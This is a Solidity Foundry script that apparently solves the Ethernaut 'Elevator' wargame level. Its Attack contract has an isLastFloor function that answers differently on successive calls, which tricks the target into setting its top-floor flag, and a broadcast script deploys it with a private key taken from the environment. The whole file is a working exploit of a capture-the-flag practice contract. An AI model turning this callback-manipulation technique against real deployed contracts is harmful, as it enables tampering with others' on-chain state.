// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import "../src/Elevator.sol";

contract Attack is Building {
    Elevator public elevator;
    uint public value;
    
    constructor(address elevatoraddress) {
        elevator = Elevator(elevatoraddress);
        value = 0;
    }

    function isLastFloor(uint _floor) external returns (bool){
        ++value;
        if(value%2==0){
            return true;
        }
        else {
            return false;
        }
    }


    function pwn() public {
        elevator.goTo(11);
    }
}

contract ElevatorScript is Script {
    Elevator public elevatorContract;

    function setUp() public {
        elevatorContract = Elevator(payable(vm.envAddress("ELEVATOR_CONTRACT")));  
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(elevatorContract));
        attack.pwn();
        vm.stopBroadcast();
    }
}